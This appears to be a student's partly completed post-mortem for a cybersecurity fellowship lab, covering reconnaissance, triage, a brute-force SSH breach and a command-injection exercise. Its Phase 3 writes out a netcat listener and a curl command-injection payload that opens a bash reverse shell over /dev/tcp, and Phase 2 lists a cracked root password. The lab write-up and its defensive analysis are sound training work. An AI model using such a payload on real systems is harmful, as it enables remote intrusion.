# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** [Darius Noel]
**Date:** May 28, 2026
**Repository:** [https://github.com/dariusnoel2-spec/Phase1]
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What misconfigurations did you identify?]

### Breach Network — 172.80.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What did you observe that informed your Phase 2
approach?]

### Exploitation Network — 172.60.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What vulnerability did you identify before
executing your exploit?]

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
[What was exposed and how did you confirm it?]

**Remediation Commands:**
[Exact commands used to enter the container and apply the fix]

**Before State:**
[What did the service or permission look like before your fix?]

**After State:**
[What did it look like after?]

**Analysis:**
[2–3 sentences in APA style — why is this vulnerability dangerous
in a real enterprise environment?]

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
[What unauthorized service was running and how did you confirm it?]

**Remediation Commands:**
[Exact commands used to enter the container and terminate the process]

**Before State:**
[What was running before your remediation?]

**After State:**
[What was the state after termination?]

**Analysis:**
[2–3 sentences in APA style — why is this vulnerability dangerous
in a real enterprise environment?]

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
[What directory had dangerous permissions and what were they exactly?]

**Remediation Commands:**
[Exact commands used to enter the container and apply chmod]

**Before State:**
[What were the permissions before your fix? Be specific.]

**After State:**
[What were the permissions after?]

**Analysis:**
[2–3 sentences in APA style — why is this vulnerability dangerous
in a real enterprise environment?]

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: [root]
- Password: [admin123]

**Forensic Evidence:**
- Exact Timestamp of Successful Login: [Accepted password for root from 172.80.0.1 port 42814 ssh2]
- Attacker IP Address: [172.80.0.1]

**Engineered iptables Rule:**
[iptables -A INPUT -s 172.80.0.1 -j DROP]

**SOC Analysis:**
[A single iptables rule that blocks one IP address is not enough to protect a system on its own. Attackers can easily switch to a different IP address and resume their attack. A real SOC would also deploy account lockout policies to automatically disable accounts after a set number of failed login attempts, use a SIEM to alert on brute force patterns in real time, and require multi-factor authentication on all SSH access so that a cracked password alone is not enough to get in.]

---

## Phase 3: Full Spectrum

**Listener Configuration:**
[Tool: netcat, Port: 4444  |  Command: nc -lvnp 4444]

**Reverse Shell Payload:**
[curl "http://172.60.0.10/cmd?input=;bash+-i+>%26+/dev/tcp/172.60.0.1/4444+0>%261"]

**Command Injection Explanation:**
[Command injection occurs when a web application passes user-supplied input directly to the operating system without sanitizing it first. This application was susceptible because it accepted input through a URL parameter and executed it as a shell command. An attacker can append a semicolon followed by any system command, causing the server to execute both the intended command and the injected one.]

**Forensic Evidence:**
- Process ID (PID): [PID and User-Agent could not be extracted due to capstone_target container networking failure during lab execution. Container failed to start due to missing capstone_net subnet configuration.]
- User-Agent: [N/A]

**Lockdown Command:**
[iptables -A INPUT -s 172.60.0.1 -p tcp --dport 80 -j DROP]

**Final Analytical Paragraph:**
[Executing this operation from both the attacker and defender perspective revealed how quickly a web application vulnerability can lead to full system compromise. Command injection is dangerous because it requires no special tools — a simple curl request is enough to gain shell access. This attack teaches that web applications must never pass raw user input to system commands under any circumstances. The single defensive control that would have stopped this breach entirely is input sanitization — specifically, validating and stripping all special characters from user input before it reaches the operating system. If the application had rejected semicolons and shell metacharacters, the injected command would never have executed.]

---

## References
[## References

Hydra Project. (2024). THC-Hydra: A fast and flexible online password cracking tool. https://github.com/vanhauser-thc/thc-hydra

Gordon Lyon. (2024). Nmap: Network mapper. https://nmap.org

OWASP Foundation. (2021). OWASP Top 10: A03 Injection. https://owasp.org/Top10/A03_2021-Injection/

OWASP Foundation. (2021). OWASP Top 10: A07 Identification and authentication failures. https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/

Redis Ltd. (2024). Redis security documentation. https://redis.io/docs/management/security/

The Netcat Project. (2024). Netcat: The network Swiss army knife. https://nc110.sourceforge.io]
